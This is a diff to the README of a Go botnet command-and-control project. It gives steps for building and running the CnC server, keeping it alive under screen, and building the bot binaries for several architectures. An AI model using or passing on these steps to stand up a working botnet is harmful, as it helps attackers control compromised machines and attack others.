@@ -20,47 +20,32 @@ This project implements a simple Botnet Control and Command (CnC) server in Go, 
    git clone https://github.com/Birdo1221/BotnetGo.git
    cd BotnetGo/cnc
    ```
-
 2. **Install dependencies**:
-
-   ```bash
-   go mod tidy
-   ```
-   If you are experiencing errors / issues or just 
-   want to reinstall to redo the Mod files just do:
-   
    ```bash
    go mod init cnc
    go mod tidy
    ```
-
 3. **Build the project**:
-   
    ```bash
    go build -o cnc *.go
    ```
-
 4. **Run the server**:
    If the any of the ports are defined below 1024,
-   you will need to run with sudo privilages to bind to that port
-   
-   ```bash
+   you will need to run with sudo privilages to bind to that port.
+   I would also recommend running using ```screen``` to run with it so it
+   doesnt get killed for idle memory usage or kill the process after you close the program
+    ```bash
    ./cnc
+    
+   sudo apt install screen 
+   screen ./cnc 
    ```
    
-5. **Running the Device / Bot files**:
+6. **Running the Device / Bot files**:
    You bascially want to enter into the ```bash Devices``` Directory
    and do the exact same you did in the CNC directory
    ```bash
    cd ../device
-   go mod tidy
-   ```
-   If you are experiencing errors / issues or just 
-   want to reinstall to redo the Mod files just do:
-   
-   ```bash
-   go mod init cnc
-   go mod tidy
    ```
    Then to build just run the build.sh script to make all the different arch types,
    but if you just want to build it for standard x86 or just without defining anything just run
